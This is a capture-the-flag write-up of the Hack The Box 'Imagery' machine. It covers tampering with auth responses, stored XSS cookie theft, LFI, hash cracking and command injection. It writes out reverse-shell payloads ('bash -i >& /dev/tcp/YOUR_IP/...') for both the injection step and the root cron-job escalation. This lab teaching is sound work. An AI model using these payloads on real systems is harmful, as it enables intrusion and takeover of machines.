# 💭 HTB Machine: Imagery
![Screenshot](https://imgur.com/NhLRuc8.png)
### 🌐 Machine Information
- **IP:**  10.10.11.88
- **OS:** Linux
### 🧭 Reconnaissance
- I started with an nmap scan to discover open ports and services:: `nmap -A -p- 10.10.11.88 -oN nmap_scan`
![Screenshot](https://imgur.com/4dRAWG9.png)
- Nmap revealed two open ports—22, which runs SSH, and 8000, which runs HTTP.
- Visiting port 8000 in a browser redirected me to a web application.
![Screenshot](https://imgur.com/fbDJBAK.png)
### 🌐 Exploring the Web Application
- The site featured login and register pages, so I registered a new account and logged in.
- After logging in, I found an Upload feature (image upload).
![Screenshot](https://imgur.com/hmH0TIL.png)
![Screenshot](https://imgur.com/TTBIrAI.png)
- I tried uploading a simple XSS payload through the upload field, but it failed.
- I then intercepted the image upload request in Burp to see whether non-image payloads could be uploaded (e.g., a web shell). The upload returned an error and the uploaded image could not be accessed.
- While intercepting, I noticed a separate endpoint: /auth_status. Inspecting the response revealed flags like isAdmin and isTestUser.
![Screenshot](https://imgur.com/xclpWfM.png)
### 🛠️ Gaining Admin Access via auth_status Tampering
- I modified the intercepted /auth_status response to set isAdmin: true.
- After forwarding the modified response, a new Admin Panel button appeared in the header.
![Screenshot](https://imgur.com/mTK6Sjx.png)
- Notes: I kept the Burp proxy active and repeatedly altered /auth_status responses to maintain admin UI visibility while I explored.
- When accessing the Admin Panel, a request to /admin/users returned 403 Forbidden and some JSON. 
![Screenshot](https://imgur.com/T7swCdD.png)
I inspected the client-side source and found references that let me craft a valid-looking /admin/users JSON response. I used:
    ```
    {
      "success": true,
      "anyAdminExists": true,
      "users": [
        {
          "username": "a@a.a",
          "isAdmin": true,
          "displayId": "[see on the upload page]"
        }
      ]
    }
    ```
- Forwarding that request triggered another admin endpoint: /admin/bug_reports, which also returned 403 Forbidden. From the page source, I determined the bug details field was not sanitized — potential stored XSS if an admin views bug reports.
- Note: at this point i stopped my burp proxy
![Screenshot](https://imgur.com/S1mblfD.png)
### 💉 Exploiting Stored XSS to Steal Admin Cookie
- I crafted a malicious bug report payload so that when an admin viewed the report, the admin’s cookie would be exfiltrated to my listener that i set up with netcat: `nc -lvnp 80`
- There is a separate page for bug reporting, that page can be found on the page's footer
![Screenshot](https://imgur.com/A53JUMl.png)
- So i intercepted the report request and here is the payload i use:
![Screenshot](https://imgur.com/ES9ASyQ.png)
- The listener received an HTTP request containing the admin cookie, confirming the XSS worked.
![Screenshot](https://imgur.com/50mtyMO.png)
- I replaced my session cookie with the captured cookie, refreshed, and gained persistent admin access without modifying /auth_status anymore.
![Screenshot](https://imgur.com/RY1TGR7.png)
### 📁 Admin Panel: Download Logs & LFI
- In the Admin Panel, there was a Download Log functionality.
- I intercepted and manipulated the download request and discovered a Local File Inclusion (LFI) style behaviour — I was able to retrieve server-side files.
![Screenshot](https://imgur.com/Bcj8ZwX.png)
### 🔎 Source Code Discovery
- Using the admin UI / LFI, I enumerated the filesystem and reviewed source files. Notable paths:
-- /home/web/web/app.py
        ![Screenshot](https://imgur.com/hWkNNth.png)
-- /home/web/web/config.py
        ![Screenshot](https://imgur.com/xArdNFt.png)
- `config.py` referenced DATA_STORAGE_PATH pointing to db.json. Inspecting db.json revealed password hashes for admin and testuser.
![Screenshot](https://imgur.com/CPrpKpL.png)
- I cracked the testuser hash using online cracking (hashes.com):
![Screenshot](https://imgur.com/zFFCAOP.png)
- The admin hash could not be cracked with rockyou.txt (Hashcat exhausted).
### 🐍 Command Injection — Image Transformation
- While reading api_edit code, I discovered an image transformation function that executed shell commands without proper sanitization. The service called out to the system shell and included user-controlled parameters, which allowed command injection by terminating the expected argument and appending shell commands (e.g., ; [command]).
![Screenshot](https://imgur.com/6ouZncH.png)
- To be able to access Image Transformation feature, i need to be logged in as testuser, because before i've already cracked testuser's password, i can login as testuser
- After logged in as testuser, i need to upload an image, then go to gallery, use the Image Transformation feature to crop the image.
- Before Cropping the image, i turn on my burp proxy to intercept the crop image so i can inject my payload
- For the payload i use this: `"100; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'; #",`
![Screenshot](https://imgur.com/wHZHvVD.png)
- Before forwarding the request, i set up a netcat listener to listen on port 4444
- Forward the request → got a reverse shell as the web user.
![Screenshot](https://imgur.com/RIL9fh8.png)
### 🗃️ Finding Backups & Encrypted Archive
- From the web shell, I discovered:
-- /var/backup/web_20250806_120723.zip.aes
-- /home/web/web/bot/admin.py (contained an admin password)
        ![Screenshot](https://imgur.com/ucqiakN.png)
- Because the .zip.aes file was encrypted, I transferred it to my local machine and used a Python pyAesCrypt-based bruteforce script to recover the archive password.Because the .zip.aes file was encrypted, I transferred it to my local machine and used a Python pyAesCrypt-based bruteforce script to recover the archive password.
![Screenshot](https://imgur.com/Y658oB2.png)
- The extracted archive contained more user data on its db.json, including users mark and web (as seen in /etc/passwd).
![Screenshot](https://imgur.com/GSLE93A.png)
- I found hashes for mark and cracked them via hashes.com
![Screenshot](https://imgur.com/pSebpPo.png)
- cracked password allowed switching to mark in the existing shell.
![Screenshot](https://imgur.com/A0j0qu7.png)
- As mark, I retrieved the user flag from /home/mark/user.txt.
![Screenshot](https://imgur.com/LZDNibq.png)
### ⬆️ Privilege Escalation to Root via Charcol
- While on the mark account, sudo -l showed mark could run a binary charcol as root.
![Screenshot](https://imgur.com/Y8WWpBU.png)
- Attempting to access charcoal initially required a passphrase. However, charcoal supported a --R (reset) parameter that requested mark's own password — allowing me to remove/reset the passphrase.
![Screenshot](https://imgur.com/fJIpSoj.png)
- After resetting, I got into the charcoal shell. charcoal runs as root and exposes several functions — notably backup and automated job.
- I attempted to use backup to pull /root/ but couldn't, even with path traversal.
![Screennshot](https://imgur.com/5lP6NiQ.png)
- The automated job feature, however, allowed adding jobs that run arbitrary shell commands as root.
- I used this command on the Charcol shell: `auto add --schedule "* * * * *" --command 'bash -c "bash -i >& /dev/tcp/YOUR_IP/6666 0>&1"' --name "root_shell"`
- So it can run the reverse shelll script every minute
- But before running the command, i setup a netcat to listen on port 6666
![Screenshot](https://imgur.com/WHkoe2u.png)
- Within a minute, the cron job executed as root and connected back — giving a root shell.
![Screenshot](https://imgur.com/J0CC6tu.png)
- Finally, I retrieved the root flag from /root/root.txt.
- ![Screenshot](https://imgur.com/jQhWpnk.png)